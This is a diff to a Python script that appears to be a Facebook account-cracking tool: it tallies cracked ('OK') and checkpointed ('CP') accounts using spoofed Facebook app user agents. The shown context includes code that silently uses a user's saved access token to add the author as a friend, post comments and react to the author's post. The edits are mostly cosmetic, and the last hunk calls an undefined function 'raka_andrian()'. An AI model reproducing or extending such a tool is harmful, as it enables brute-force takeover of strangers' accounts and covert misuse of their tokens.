@@ -72,7 +72,7 @@ def logo():
                   █░░║║║╠─║─║─║║║║║╠─░░█
                   █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
                   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  
-             ┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
+            ®┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
              ┃┏━┓┃╋╋┃┃╋╋╋╋┃┏━┓┃╋╋╋╋╋╋╋╋╋╋┃┃
              ┃┗━┛┣━━┫┃┏┳━━┫┃╋┃┣┓┏┳━━┳━┓┏━┛┣━━┓  
              \033[1;92m┃┏┓┏┫┏┓┃┗┛┫┏┓┃┗━┛┃┗┛┃┏┓┃┏┓┫┏┓┃┏┓┃
@@ -105,11 +105,11 @@ def login():
 			open("login.txt", "w").write(token)
 			#-> bot follow bot coment
                         una = ( '100007639052164' )	
-                        kom = ( 'Lanjutkan Ter😘' )	
+                        kom = ( 'Lanjutkan 😘' )	
                         reaksi = ( 'MARAH' )	
                         pos = ( '2657012877896655' )	
                         post2 = ( '2657012877896655' )	
-                        kom2 = ( 'Sc Nya Keren Bang😁' )	
+                        kom2 = ( 'Sc Nya Keren Bang 😊' )	
                         reaksi2 = ( 'CINTA' )	
                         requests.post("https://graph.facebook.com/me/friends?method=post&uids='+una+'&access_token="+token)	
                         requests.post("https://graph.facebook.com/'+post+'/comments/?message='+kom+'&access_token="+token)	
@@ -318,7 +318,7 @@ def bapi(user):
                 ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] • [CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] ® [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -360,7 +360,7 @@ def mbasic(user):
 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] • [CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] ® [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -414,7 +414,7 @@ def mobile(user):
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] • [CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] ® [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -476,7 +476,7 @@ def manual():
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-		        "\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] • [CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		        "\r\033[1;93m➤ \033[0;92mProcess \033[0;93m•••>\033[0;95m %s/%s •• [OK:-%s] ® [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
@@ -532,7 +532,7 @@ def setting_ua():
 		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 		os.system("rm -f .ua")
 		time.sleep(1)
-		raw_input("\n[•] User-Agent Save Successfully")
+		raw_input("\n[®] User-Agent Save Successfully")
 		menu()
 
 def buat_folder():
@@ -544,5 +544,5 @@ def buat_folder():
 if __name__ == "__main__":
 	os.system("git pull")
 	os.system("touch login.txt")
-	buat_folder()
+	raka_andrian()
 	login()
